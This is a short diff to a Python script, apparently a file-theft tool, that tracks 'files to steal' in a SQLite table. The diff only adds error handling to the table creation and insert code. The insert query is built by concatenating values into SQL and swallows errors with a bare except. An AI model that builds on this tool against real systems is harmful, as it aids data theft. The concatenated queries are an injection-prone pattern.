@@ -99,11 +99,15 @@ def create_men_db(conn):
 def create_file_db(conn):
     '''Create a table in the local SQLite3 database to hold data on files to steal'''
     # Connection object comes from the caller
-    c = conn.cursor()
-    c.execute('drop table if exists swag')
-    c.execute('create table swag(name text, dtg datetime, priority integer, stolen bool)')
-    conn.commit()
-    c.close()
+    try:
+        c = conn.cursor()
+        c.execute('drop table if exists swag')
+        c.execute('create table swag(name text, dtg datetime, priority integer, stolen bool)')
+        conn.commit()
+        c.close()
+    except Exception as e:
+        print('ERROR: Unable to create file table:', e, 'Exiting...')
+        sys.exit(1)
     
 def steal_a_file(conn, my_ip):
     '''Get the highest priority "unstolen" file in the files table and copy it to the datadir'''
@@ -128,7 +132,10 @@ def store_file_info(conn, filelst):
         for item in file[:-1]:
             query += "'" + str(item) + "',"
         query += "'" + str(file[-1]) + "')"
-        c.execute(query)
+        try:
+            c.execute(query)
+        except:
+            pass
     conn.commit()
     c.close()
     
